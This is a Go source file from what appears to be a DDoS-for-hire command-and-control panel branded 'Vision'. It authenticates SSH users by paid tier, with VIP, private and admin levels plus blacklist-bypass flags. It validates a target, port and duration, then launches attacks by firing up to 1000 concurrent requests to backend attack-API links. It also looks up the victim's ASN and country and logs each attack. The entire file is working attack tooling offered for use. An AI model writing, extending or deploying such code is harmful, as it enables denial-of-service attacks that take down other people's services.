package managers

import (
	"arismcnc/database"
	"arismcnc/utils"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gliderlabs/ssh"
)

type MethodInfo struct {
	defaultPort uint16
	defaultTime uint32
	MinTime     uint32
	MaxTime     uint32
}

type Attack struct {
	Duration   uint32
	Type       uint8
	Target     string
	Port       string
	MethodName string
	API        []string
	Enabled    bool
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func NewAttack(session ssh.Session, args []string, vip bool, private bool, admin bool, maxtime int, db *database.Database) (*Attack, error) {
	var atkInfo MethodInfo
	userInfo := db.GetAccountInfo(session.User())
	expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
	if err != nil {
		log.Print(err)
	}

	if len(args) == 1 {
		return nil, errors.New("[ Vision ] • Invalid number of arguments. Usage: <method> <target> <port> <duration>")
	}

	if len(args) != 4 {
		return nil, errors.New("[ Vision ] • Invalid number of arguments. Usage: <method> <target> <port> <duration>")
	}

	method, err := utils.GetMethod(args[0])
	insufficientPermissionsBrand := utils.Branding(session, "insufficient-permissions", map[string]interface{}{
		"user.Username":            session.User(),
		"user.Expiry":              utils.CalculateExpiryString(expiryTime),
		"user.Admin":               utils.CalculateInt(userInfo.Admin),
		"user.Vip":                 utils.CalculateInt(userInfo.Vip),
		"user.Private":             utils.CalculateInt(userInfo.Private),
		"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
		"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
		"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
		"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
		"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
		"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
		"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
		"user.SSH_Client":          session.Context().ClientVersion(),
		"user.Created_by":          userInfo.CreatedBy,
		"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
		"clear":                    "\x1b[2J \x1b[H",
		"sleep": func(duration int) {
			time.Sleep(time.Duration(duration) * time.Millisecond)
		},
	})

	if utils.HasVipPermission(method.Method) && !vip {
		return nil, errors.New(insufficientPermissionsBrand)
	}
	if utils.HasPrivatePermission(method.Method) && !private {
		return nil, errors.New(insufficientPermissionsBrand)
	}
	if utils.HasAdminPermission(method.Method) && !admin {
		return nil, errors.New(insufficientPermissionsBrand)
	}

	atkInfo = MethodInfo{
		defaultPort: method.DefaultPort,
		defaultTime: method.DefaultTime,
		MinTime:     method.MinTime,
		MaxTime:     method.MaxTime,
	}
	atk := &Attack{
		MethodName: args[0],
		Target:     args[1],
	}

	port, err := strconv.Atoi(args[2])
	if err != nil {
		return nil, errors.New("\u001B[91mInvalid port.\u001B[0m")
	}
	atk.Port = strconv.Itoa(port)

	duration, err := strconv.Atoi(args[3])
	if err != nil || uint32(duration) < atkInfo.MinTime || uint32(duration) > atkInfo.MaxTime || duration > maxtime {
		return nil, fmt.Errorf("\033[97mInvalid attack duration, near %s. Duration must be between %d and %d seconds", args[3], atkInfo.MinTime, atkInfo.MaxTime)
	}
	atk.Duration = uint32(duration)
	atk.API = method.API
	atk.Enabled = method.Enabled

	return atk, nil
}

func (this *Attack) Build(session ssh.Session, db *database.Database) (bool, error, string) {
	userInfo := db.GetAccountInfo(session.User())
	apiList := this.API
	apiLen := len(apiList)

	if !this.Enabled {
		return false, errors.New("Method not enabled"), ""
	}

	// Start actual attack triggering in background so it doesn't block UI
	go func() {
		// Kanał do synchronizacji gorutyn
		responses := make(chan string, apiLen)

		// Własny klient HTTP z Transportem
		client := &http.Client{
			Transport: &http.Transport{
				MaxIdleConns:        1000, // Maksymalna liczba połączeń równoległych
				MaxIdleConnsPerHost: 1000,
				IdleConnTimeout:     30 * time.Second,
			},
			Timeout: 2 * time.Second, // Maksymalny czas oczekiwania na odpowiedź
		}

		// Używamy WaitGroup do monitorowania gorutyn
		var wg sync.WaitGroup

		// Uruchamiamy gorutyny (używamy puli gorutyn)
		concurrencyLimit := 1000 // Maksymalna liczba gorutyn równolegle
		sem := make(chan struct{}, concurrencyLimit)

		// Uruchamiamy gorutyny
		for _, apiLink := range apiList {
			// Przygotowujemy link z wypełnionymi placeholderami
			finalLink := replacePlaceholders(apiLink, this.MethodName, this.Target, this.Port, this.Duration)

			wg.Add(1)
			go func(link string) {
				defer wg.Done() // Zmniejsza licznik WaitGroup po zakończeniu gorutyny

				// Czekamy na dostępność w semaforze, co pozwala na 1000 równoległych połączeń
				sem <- struct{}{}
				defer func() { <-sem }() // Zwolnienie semafora po zakończeniu gorutyny

				// Zamiast http.Get używamy klienta z Transportem
				res, err := client.Get(link)
				if err != nil {
					log.Printf("[ATTACK] Error sending request to: %s - %v", link, err)
					responses <- fmt.Sprintf("[ATTACK] %s response: error", link)
					return
				}
				defer res.Body.Close()

				// Poczekaj na odpowiedź i odczytaj odpowiedź z serwera
				_, err = io.Copy(io.Discard, res.Body) // Szybko kopiujemy odpowiedź, ale jej nie przetwarzamy
				if err != nil {
					log.Printf("[ATTACK] Error reading response from: %s - %v", link, err)
					responses <- fmt.Sprintf("[ATTACK] %s response: read error", link)
					return
				}

				// Minimalizujemy logowanie, ale wciąż informujemy, że zapytanie zostało wysłane
				responses <- fmt.Sprintf("[ATTACK] %s response: sent", link)
			}(finalLink)
		}

		// Czekamy na zakończenie wszystkich gorutyn
		wg.Wait()
		close(responses)

		// Optymalizujemy końcowy log (można wprowadzić asynchroniczność w logowaniu)
		log.Printf("[INFO] Attack to %d targets completed", len(apiList))
	}()

	// Informacje o IP i ASN
	type IpApiResult struct {
		Country string `json:"country"`
		Org     string `json:"organization"`
		Region  string `json:"region"`
	}

	type IpInfoResult struct {
		Country string `json:"country"`
		Org     string `json:"org"`
		Region  string `json:"region"`
	}

	var url string
	var data interface{}

	// Declare dataMap at outer scope so switch and assignment later can see it
	var dataMap map[string]string

	if strings.Contains(this.Target, "http") || strings.Contains(this.Target, "www") {
		url = "http://YOUR_PROXY_HOST:PORT/?ip=" + this.Target
		data = &IpApiResult{}
	} else {
		url = "https://ipinfo.io/" + this.Target + "/json?token=YOUR_IPINFO_TOKEN"
		data = &IpInfoResult{}
	}

	client := &http.Client{Timeout: 3 * time.Second}
	asninfo, err := client.Get(url)
	if err != nil {
		log.Println("[!] Failed to retrieve ASN info:", err)
		dataMap = map[string]string{
			"country": "Unknown",
			"org":     "Unknown",
			"region":  "Unknown",
		}
	} else {
		defer asninfo.Body.Close()

		content, err := ioutil.ReadAll(asninfo.Body)
		if err != nil {
			log.Println("[!] Failed to read ASN info response:", err)
		} else {
			err = json.Unmarshal(content, data)
			if err != nil {
				log.Println("[!] Failed to parse ASN info JSON:", err)
			} else {
				switch v := data.(type) {
				case *IpApiResult:
					dataMap = map[string]string{
						"country": v.Country,
						"org":     v.Org,
						"region":  v.Region,
					}
				case *IpInfoResult:
					dataMap = map[string]string{
						"country": v.Country,
						"org":     v.Org,
						"region":  v.Region,
					}
				}
			}
		}
	}

	lm, err := NewLogManager("./assets/logs/logs.json")
	if err != nil {
		fmt.Println("Error initializing LogManager:", err)
		os.Exit(1)
	}
	defer lm.Close()

	lm.Log("New Attack (C2)!\nUsername: " + session.User() + "\nTarget: " + this.Target + "\nPort: " + this.Port + "\nTime: " + strconv.Itoa(int(this.Duration)) + "\nMethod: " + this.MethodName + "\n----------------------")
	timeString := time.Now().Format("2006-01-02 15:04:05")
	expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
	if err != nil {
		log.Print(err)
	}
	sentMessage := utils.Branding(session, "attack-sent", map[string]interface{}{
		"attack.Target":            this.Target,
		"attack.Port":              this.Port,
		"attack.Time":              strconv.Itoa(int(this.Duration)),
		"attack.Method":            this.MethodName,
		"attack.Country":           dataMap["country"],
		"attack.Org":               dataMap["org"],
		"attack.Region":            dataMap["region"],
		"attack.Date":              timeString,
		"user.Username":            session.User(),
		"user.Expiry":              utils.CalculateExpiryString(expiryTime),
		"user.Admin":               utils.CalculateInt(userInfo.Admin),
		"user.Vip":                 utils.CalculateInt(userInfo.Vip),
		"user.Private":             utils.CalculateInt(userInfo.Private),
		"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
		"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
		"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
		"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
		"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
		"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
		"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
		"user.SSH_Client":          session.Context().ClientVersion(),
		"user.Created_by":          userInfo.CreatedBy,
		"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
		"clear":                    "\x1b[2J \x1b[H",
	})
	log.Println("[ Vision ] • Attack information sent to user interface")
	return false, nil, sentMessage
}

func replacePlaceholders(apiLink string, method string, target string, port string, duration uint32) string {
	// Original replacing
	apiLink = strings.ReplaceAll(apiLink, "{host}", target)
	apiLink = strings.ReplaceAll(apiLink, "{port}", port)
	apiLink = strings.ReplaceAll(apiLink, "{time}", strconv.Itoa(int(duration)))
	apiLink = strings.ReplaceAll(apiLink, "{method}", method)

	// User requested variable replacing for new API schema
	apiLink = strings.ReplaceAll(apiLink, "<<$host>>", target)
	apiLink = strings.ReplaceAll(apiLink, "<<$port>>", port)
	apiLink = strings.ReplaceAll(apiLink, "<<$time>>", strconv.Itoa(int(duration)))
	apiLink = strings.ReplaceAll(apiLink, "<<$method>>", method)
	return apiLink
}

func Contains(methods []utils.Method, s string) bool {
	for _, a := range methods {
		if a.Method == s {
			return true
		}
	}
	return false
}

func ValidIP4(s string) bool {
	ip := net.ParseIP(s)
	if ip == nil {
		return false
	}
	return true
}
